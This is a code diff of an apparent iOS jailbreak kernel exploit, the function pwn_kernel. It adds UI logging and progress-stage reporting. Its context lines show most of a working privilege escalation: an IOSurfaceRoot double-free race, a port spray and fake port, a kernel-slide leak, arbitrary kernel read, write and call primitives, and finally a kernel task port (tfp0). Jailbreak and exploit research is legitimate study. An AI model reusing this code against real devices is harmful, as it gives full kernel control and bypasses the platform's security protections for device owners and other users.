@@ -308,7 +308,7 @@ err:
     return 0x0;    
 }
 
-kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
+kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase, void* controller, void (*sendLog)(void*, NSString*))
 {
     kern_return_t ret = KERN_FAILURE;
     kport_t *fakeport                   = NULL;
@@ -325,25 +325,29 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ip_kobject_client_port_addr         = 0,
     ip_kobject_client_addr              = 0,
     client_vtab_addr                    = 0;
-
-    LOG("---> pwning kernel...");
+    
+    #define PWN_LOG(...) do { sendLog(controller, [NSString stringWithFormat:@__VA_ARGS__]); LOG(__VA_ARGS__); } while(0)
+    #define updateStage(stage) PWN_LOG("Jailbreaking... (%d/14)", stage)
+    
+    updateStage(1);
+    PWN_LOG("---> pwning kernel...");
 
     kptr_t kdata = kdata_init();
     if(!kdata) goto out;
 
-    LOG("our kdata buffer is at: %llx", kdata);
+    PWN_LOG("our kdata buffer is at: %llx", kdata);
 
     // note to friends, family, next of kin, hackers alike:
     // host_page_size - returns the userland page size, *always* 16K
     // _host_page_size - MIG call, traps to kernel, returns PAGE_SIZE macro, will return the correct page size
     vm_size_t pgsize = 0x0;
     _host_page_size(mach_host_self(), &pgsize);
-    LOG("page size: 0x%lx", pgsize);
+    PWN_LOG("page size: 0x%lx", pgsize);
     
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == MACH_PORT_NULL)
     {
-        LOG("failed to get IOSurfaceRoot service");
+        PWN_LOG("failed to get IOSurfaceRoot service");
         return KERN_FAILURE;
     }
     
@@ -351,11 +355,12 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = IOServiceOpen(service, mach_task_self(), 0, &client);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to open IOSurfaceRoot user client: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed to open IOSurfaceRoot user client: %x (%s)", ret, mach_error_string(ret));
         return KERN_FAILURE;
     }
     
-    LOG("opened client: %x", client);
+    updateStage(2);
+    PWN_LOG("opened client: %x", client);
     
     uint32_t dict_create[] =
     {
@@ -383,12 +388,13 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = IOConnectCallStructMethod(client, offsets.iosurface.create_surface, dict_create, sizeof(dict_create), surface, &size);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to call iosurface create surface");
+        PWN_LOG("failed to call iosurface create surface");
         ret = KERN_FAILURE;
         goto out;
     }
     
-    LOG("surface ID: %x", surface->id);
+    updateStage(3);
+    PWN_LOG("surface ID: %x", surface->id);
     
     // setup ports for the ool msg
     port_buffer = malloc(sizeof(mach_port_t));
@@ -411,7 +417,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     fakeport = (kport_t *)mmap(0, KDATA_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
     bzero((void *)fakeport, KDATA_SIZE);
     mlock((void *)fakeport, KDATA_SIZE);
-    LOG("fakeport: %p", fakeport);
+    PWN_LOG("fakeport: %p", fakeport);
     
     fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT;
     fakeport->ip_references = 100;
@@ -424,14 +430,15 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = kdata_write((const void *)fakeport); // causes the fakeport buffer to buf flushed into kernel 
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to write to kernel buffer! ret: %x", ret);
+        PWN_LOG("failed to write to kernel buffer! ret: %x", ret);
         goto out;
     }
 
     uint32_t spray_dictsz = 0x0, dummy = 0x0;
     size = sizeof(dummy);
     
-    LOG("pre-spraying...");
+    updateStage(4);
+    PWN_LOG("pre-spraying...");
 
     // always pre-spray, kids
     for (int i = 0; i < 100; i++)
@@ -445,13 +452,14 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
         if (ret != KERN_SUCCESS)
         {
-            LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
+            PWN_LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
             ret = KERN_FAILURE;
             goto out;
         }
     }
 
-    LOG("spraying ports & racing...");
+    updateStage(5);
+    PWN_LOG("spraying ports & racing...");
     
     // this will try to double free an obj as long as the second dword of it will be zero, obj is alloced in kalloc.16
     pthread_create(&lio_listio_thread, NULL, double_free, NULL);
@@ -487,7 +495,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
             
             the_one = *check_port;
             
-            LOG("[!] found non-null port at 0x%x", the_one);
+            PWN_LOG("[!] found non-null port at 0x%x", the_one);
 
             break;
         }
@@ -512,7 +520,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
         if (ret != KERN_SUCCESS)
         {
-            LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
+            PWN_LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
             ret = KERN_FAILURE;
             goto out;
         }
@@ -520,19 +528,20 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     
     if (the_one == MACH_PORT_NULL)
     {
-        LOG("ran out of ports :-(");
+        PWN_LOG("ran out of ports :-(");
         ret = KERN_FAILURE;
         goto out;
     }
     
-    LOG("---> we out here!");
+    updateStage(6);
+    PWN_LOG("---> we out here!");
     
     // allocate new port and assign it into port->ip_pdrequest to leak heap addr
     mach_port_t prev_port = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
     if (ret != KERN_SUCCESS)
     {
-        LOG("kernelrpc_mach_port_allocate_trap failed: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("kernelrpc_mach_port_allocate_trap failed: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
@@ -540,7 +549,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = mach_port_request_notification(mach_task_self(), the_one, MACH_NOTIFY_PORT_DESTROYED, 0, notification_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev_port);
     if (ret != KERN_SUCCESS)
     {
-        LOG("mach_port_request_notification %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("mach_port_request_notification %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
@@ -549,7 +558,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), the_one, the_one, MACH_MSG_TYPE_MAKE_SEND);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to insert send right on the_one: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed to insert send right on the_one: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
@@ -557,19 +566,20 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = kdata_read((void *)fakeport);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to read kdata buffer!");
+        PWN_LOG("failed to read kdata buffer!");
         goto out;
     }
 
     if (fakeport->ip_pdrequest == 0)
     {
-        LOG("fakeport->ip_pdrequest == 0");
+        PWN_LOG("fakeport->ip_pdrequest == 0");
         ret = KERN_FAILURE;
         goto out;
     }
     
+    updateStage(7);
     uint64_t heapaddr = fakeport->ip_pdrequest;
-    LOG("[+] got port/kernel heap address %llx", heapaddr);
+    PWN_LOG("[+] got port/kernel heap address %llx", heapaddr);
     
     // set that to somewhere in the buffer
     // kport_t is of size 0xA8
@@ -593,33 +603,34 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = mach_ports_register(mach_task_self(), &client, 1);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to call mach_ports_register on client: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed to call mach_ports_register on client: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
     
     // get our task pointer
     kr64(heapaddr + offsetof(kport_t, ip_receiver), receiver_addr);
-    LOG("[+] receiver addr %llx", receiver_addr);
+    PWN_LOG("[+] receiver addr %llx", receiver_addr);
     
     kr64(receiver_addr + offsets.struct_offsets.is_task_offset, our_task_addr);
-    LOG("[+] our task addr %llx", our_task_addr);
+    PWN_LOG("[+] our task addr %llx", our_task_addr);
     
     // get the vtab of the client
     kr64(our_task_addr + offsets.struct_offsets.itk_registered, ip_kobject_client_port_addr);
-    LOG("[+] the address of our client port %llx", ip_kobject_client_port_addr);
+    PWN_LOG("[+] the address of our client port %llx", ip_kobject_client_port_addr);
     
     kr64(ip_kobject_client_port_addr + offsetof(kport_t, ip_kobject), ip_kobject_client_addr);
-    LOG("[+] address of the UC %llx", ip_kobject_client_addr);
+    PWN_LOG("[+] address of the UC %llx", ip_kobject_client_addr);
     
     kr64(ip_kobject_client_addr, client_vtab_addr);
-    LOG("[+] kernel text leak/vtab addr %llx", client_vtab_addr);
+    PWN_LOG("[+] kernel text leak/vtab addr %llx", client_vtab_addr);
     
     kslide = client_vtab_addr - offsets.vtabs.iosurface_root_userclient;
-    LOG("[!] got kernel slide: %llx!", kslide);
+    PWN_LOG("[!] got kernel slide: %llx!", kslide);
     
     /*  set up arbitrary kernel call primitive  */
     
+    updateStage(8);
     uint64_t IOSurfaceRootUserClient_addr = ip_kobject_client_addr;
     uint64_t IOSurfaceRootUserClient_vtab = client_vtab_addr;
     
@@ -630,7 +641,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     // 0x5d0 / 8 = 0xBA methods
     // we can round to 64-bit aligned by adding 0x6, 0xBA + 0x6 = 0xC0 
     size_t vtab_msg_sz = sizeof(mach_msg_data_buffer_t) + (0xC0 * sizeof(uint64_t));
-    LOG("vtab msg size: %x", vtab_msg_sz);
+    PWN_LOG("vtab msg size: %x", vtab_msg_sz);
  
     mach_msg_data_buffer_t *vtab_msg = (mach_msg_data_buffer_t *)malloc(vtab_msg_sz);
     bzero(vtab_msg, vtab_msg_sz);
@@ -638,7 +649,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     // safety check to make sure we found the right message
     vtab_msg->verification_key = 0x4141414142424242;
 
-    LOG("cloning vtab...");
+    PWN_LOG("cloning vtab...");
     
     // copy out vtable into message body
     for (int i = 0; i < 0xC0; i++)
@@ -660,15 +671,16 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     }, our_task_addr, vtab_msg, vtab_msg_sz);
     if (kernel_vtab_buf == 0x0)
     {
-        LOG("failed to get kernel_vtab_buf!");
+        PWN_LOG("failed to get kernel_vtab_buf!");
         ret = KERN_FAILURE;
         goto out;
     }
 
-    LOG("got kernel_vtab_buf at: %llx", kernel_vtab_buf);
+    updateStage(9);
+    PWN_LOG("got kernel_vtab_buf at: %llx", kernel_vtab_buf);
 
     uint64_t fake_client = (uint64_t)fakeport + 0xC0;
-    LOG("fake_client: %llx", fake_client);
+    PWN_LOG("fake_client: %llx", fake_client);
 
     // copy out cpp client object into message body
     // we've got ~0x380 bytes of space left in our 0x400 buffer, 
@@ -690,7 +702,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = kdata_write((const void *)fakeport);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to write to kdata buffer! (2): %x", ret);
+        PWN_LOG("failed to write to kdata buffer! (2): %x", ret);
         goto out;
     }
 
@@ -774,12 +786,13 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t zone_map_addr = kread64(offsets.data.zone_map + kslide);
     if (zone_map_addr == 0x0)
     {
-        LOG("failed to get zone map addr");
+        PWN_LOG("failed to get zone map addr");
         ret = KERN_FAILURE;
         goto out;
     }
     
-    LOG("[+] got zone map addr: %llx", zone_map_addr);
+    updateStage(10);
+    PWN_LOG("[+] got zone map addr: %llx", zone_map_addr);
 
     typedef volatile struct
     {
@@ -794,15 +807,15 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
     kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
     
-    LOG("zmap start: %llx", zm_hdr.start);
-    LOG("zmap end: %llx", zm_hdr.end);
+    PWN_LOG("zmap start: %llx", zm_hdr.start);
+    PWN_LOG("zmap end: %llx", zm_hdr.end);
     
     uint64_t zm_size = zm_hdr.end - zm_hdr.start;
-    LOG("zmap size: %llx", zm_size);
+    PWN_LOG("zmap size: %llx", zm_size);
     
     if (zm_size > 0x100000000)
     {
-        LOG("zonemap too large :/");
+        PWN_LOG("zonemap too large :/");
         ret = KERN_FAILURE;
         goto out;
     }
@@ -816,11 +829,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t kern_task_addr = kread64(offsets.data.kernel_task + kslide);
     if (kern_task_addr == 0x0)
     {
-        LOG("failed to read kern_task_addr!");
+        PWN_LOG("failed to read kern_task_addr!");
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("[+] kern_task_addr: %llx", kern_task_addr);
+    PWN_LOG("[+] kern_task_addr: %llx", kern_task_addr);
     
     uint64_t kern_proc = zonemap_fix_addr(kcall(offsets.funcs.get_bsdtask_info, 1, kern_task_addr));
     if (kern_proc == 0x0)
@@ -829,41 +842,43 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("[+] got kernproc: %llx", kern_proc);;
+    PWN_LOG("[+] got kernproc: %llx", kern_proc);;
     
     uint64_t curr_task = zonemap_fix_addr(kcall(offsets.funcs.current_task, 0));
     if (curr_task == 0x0)
     {
-        LOG("failed to get curr_task!");
+        PWN_LOG("failed to get curr_task!");
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("[+] curr task: %llx", curr_task);
+    
+    updateStage(11);
+    PWN_LOG("[+] curr task: %llx", curr_task);
     
     // get kernel map
     uint64_t kernel_vm_map = kread64(kern_task_addr + 0x20);
     if (kernel_vm_map == 0x0)
     {
-        LOG("failed to read kernel_vm_map!");
+        PWN_LOG("failed to read kernel_vm_map!");
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("got kernel vm map: %llx", kernel_vm_map);
+    PWN_LOG("got kernel vm map: %llx", kernel_vm_map);
     
     uint64_t ipc_space_kernel = kread64(ip_kobject_client_port_addr + offsetof(kport_t, ip_receiver));;
     if (ipc_space_kernel == 0x0)
     {
-        LOG("failed to read ipc_space_kernel!");
+        PWN_LOG("failed to read ipc_space_kernel!");
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("ipc_space_kernel: %llx", ipc_space_kernel);
+    PWN_LOG("ipc_space_kernel: %llx", ipc_space_kernel);
     
     uint64_t ptrs[2] = { 0 };
     ptrs[0] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
     ptrs[1] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
-    LOG("zm_port addr: %llx", ptrs[0]);
-    LOG("km_port addr: %llx", ptrs[1]);
+    PWN_LOG("zm_port addr: %llx", ptrs[0]);
+    PWN_LOG("km_port addr: %llx", ptrs[1]);
     
     size_t ktask_size = offsets.struct_offsets.sizeof_task;
 
@@ -894,20 +909,20 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t zm_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, zm_task_buf_msg, ktask_size);
     if (zm_task_buf_addr == 0x0)
     {
-        LOG("failed to get zm_task_buf_addr!");
+        PWN_LOG("failed to get zm_task_buf_addr!");
         goto out;
     }
 
-    LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);
+    PWN_LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);
 
     uint64_t km_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, km_task_buf_msg, ktask_size);
     if (km_task_buf_addr == 0x0)
     {
-        LOG("failed to get km_task_buf_addr!");
+        PWN_LOG("failed to get km_task_buf_addr!");
         goto out;
     }
 
-    LOG("km_task_buf_addr: %llx", km_task_buf_addr);
+    PWN_LOG("km_task_buf_addr: %llx", km_task_buf_addr);
 
     kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
     kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);
@@ -920,18 +935,18 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
     
-    LOG("zone_map port: %x", maps[0]);
-    LOG("kernel_map port: %x", maps[1]);
+    PWN_LOG("zone_map port: %x", maps[0]);
+    PWN_LOG("kernel_map port: %x", maps[1]);
     
     if (!MACH_PORT_VALID(maps[0]) ||
         !MACH_PORT_VALID(maps[1]))
     {
-        LOG("invalid zone/kernel map ports");
+        PWN_LOG("invalid zone/kernel map ports");
         ret = KERN_FAILURE;
         goto out;
     }
@@ -941,19 +956,20 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, 0x0);
     kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, 0x0);
     
-    LOG("kern_task_addr: %llx", kern_task_addr);
+    PWN_LOG("kern_task_addr: %llx", kern_task_addr);
     
     mach_vm_address_t remap_addr = 0x0;
     vm_prot_t cur = 0x0, max = 0x0;
     ret = mach_vm_remap(maps[1], &remap_addr, offsets.struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
     if (ret != KERN_SUCCESS)
     {
-        LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
     
-    LOG("[+] remap addr: %llx", remap_addr);
+    updateStage(12);
+    PWN_LOG("[+] remap addr: %llx", remap_addr);
 
     // usleep(500000);
     
@@ -968,13 +984,13 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = kcall(offsets.funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
     
     uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
-    LOG("new_port: %llx", new_port);
+    PWN_LOG("new_port: %llx", new_port);
     
     // usleep(500000);
 
@@ -982,11 +998,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
     
     uint64_t realhost = offsets.data.realhost + kslide;
-    LOG("[!] realhost: %llx", realhost);
+    PWN_LOG("[!] realhost: %llx", realhost);
     
     // realhost->special[4]
     kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
-    LOG("registered realhost->special[4]");
+    PWN_LOG("registered realhost->special[4]");
 
     // zero out old ports before overwriting
     for (int i = 0; i < 3; i++)
@@ -995,7 +1011,9 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     }
 
     kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
-    LOG("wrote new port: %llx", new_port);
+    
+    updateStage(13);
+    PWN_LOG("wrote new port: %llx", new_port);
     
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
     
@@ -1003,7 +1021,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
@@ -1011,11 +1029,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     mach_port_t kernel_task = maps[0];
     if (!MACH_PORT_VALID(kernel_task))
     {
-        LOG("kernel_task is invalid");
+        PWN_LOG("kernel_task is invalid");
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("got kernel task port: %x", kernel_task);
+    PWN_LOG("got kernel task port: %x", kernel_task);
 
     // should be ready? pullup !
 
@@ -1027,15 +1045,16 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ret = mach_vm_read(kernel_task, kernel_base, sizeof(uint64_t), &data_out, &out_size);
     if (ret != KERN_SUCCESS)
     {
-        LOG("failed read on kern base via tfp0: %x (%s)", ret, mach_error_string(ret));
+        PWN_LOG("failed read on kern base via tfp0: %x (%s)", ret, mach_error_string(ret));
         ret = KERN_FAILURE;
         goto out;
     }
-
-    LOG("---> task for pid 0 achieved!");
-    LOG("[!] kernel base data: %llx", *(uint64_t *)data_out);
     
-    LOG("---> exploitation complete.");
+    updateStage(14);
+    PWN_LOG("---> task for pid 0 achieved!");
+    PWN_LOG("[!] kernel base data: %llx", *(uint64_t *)data_out);
+    
+    PWN_LOG("---> exploitation complete.");
     
     *tfp0 = kernel_task;
     *kbase = kernel_base;
